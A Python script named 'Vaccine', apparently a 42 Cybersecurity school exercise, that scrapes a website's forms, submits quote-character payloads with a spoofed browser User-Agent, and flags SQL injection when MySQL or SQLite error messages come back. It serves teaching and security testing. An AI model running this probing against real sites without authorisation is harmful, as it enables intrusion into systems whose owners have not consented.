#!/usr/bin/env python3

import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# keep session open 
s = requests.Session ()
# you make the website believe that the request comes from a real user using a browser.
s.headers ["User-Agent"] = "Mozilla/5.0 (Win64; x64) AppleWebKit/537.36 Chrome/87.0.4280.88"


# return all form find
def get_forms(url):
    q = BeautifulSoup(s.get(url).content, "html.parser")
    return q.find_all("form")

# Exemple 
# [
#     <form action="/submit_login" method="post">
#         <input type="text" name="username" value="">
#         <input type="password" name="password" value="">
#         <input type="submit" value="Login">
#     </form>,
    
#     <form action="/submit_signup" method="post">
#         <input type="text" name="username" value="">
#         <input type="password" name="password" value="">
#         <input type="email" name="email" value="">
#         <input type="submit" value="Sign Up">
#     </form>
# ]

# returns a detailed dictionary form 
def form_details(form):
    detailsOfForm = {}
    # retrieve attribut action and method since form 
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower() # "get" is the default if method is not specified
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append(
            {"type": input_type, "name": input_name, "value": input_value}
        )
    detailsOfForm["action"] = action
    detailsOfForm["method"] = method
    detailsOfForm["inputs"] = inputs
    # print(f"detailsForm: {detailsOfForm}")
    return detailsOfForm

# detailsOfForm  = {
#     "action": "http://example.com/submit_signup",
#     "method": "post",
#     "inputs": [
#         {"type": "text", "name": "username", "value": ""},
#         {"type": "password", "name": "password", "value": ""},
#         {"type": "email", "name": "email", "value": ""}
#     ]
# }

def vulnerable(response):
    # print("Response content:", response.content.decode().lower())
    errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unrecognized token",
        "sqlite error",
        "fatal error",
        "mysqli_sql_exception"
    ]
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False


def SQLi(url, req_method):
    print(f"iuhewouhfohfweohfweoihfwe : {req_method}")
    f = get_forms(url)
    print(f"[+] {len(f)} forms found on {url}.")
    for form in f:
        d = form_details(form)
        print(d)
        for c in "\"'":
            data = {}
            for i_tag in d["inputs"]:
                if i_tag["type"] == "hidden" or i_tag["value"]:
                    data[i_tag["name"]] = i_tag["value"] + c
                elif i_tag["type"] != "submit":
                    data[i_tag["name"]] = f"test{c}"
            form_action_url = urljoin(url, d["action"])
            if req_method == 'POST':
                r = s.post(form_action_url, data=data)
            # elif d["method"] == "get":
            else:
                r = s.get(form_action_url, params=data)
            print("\n")
            print(r)
            if vulnerable(r):
                print("SQLi attack detected:", form_action_url)
                print("Payload used:", data)
            else:
                print("Not detected with payload:", data)

if __name__ == "__main__":

    parser = argparse.ArgumentParser(
                    prog='Vaccine',
                    description='vaccine which allows you to perform an SQL injection by providing a url as parameter.',
                    epilog='42 Cybersecurity')

    parser.add_argument('URL', type=str, help='The URL of the website to perform SQL injection')
    parser.add_argument('-o', type=str, default="archive", help='Archive file, if not specified it will be stored in a default one.')
    parser.add_argument('-X', type=str, default="GET", help='Type of request, if not specified GET will be used.')

    args = parser.parse_args()
    print(args)

    SQLi(args.URL, args.X)
    # params = ['id', 'name', 'search']
    # for param in params:
    #     test_injection(args.URL, param, args.X)

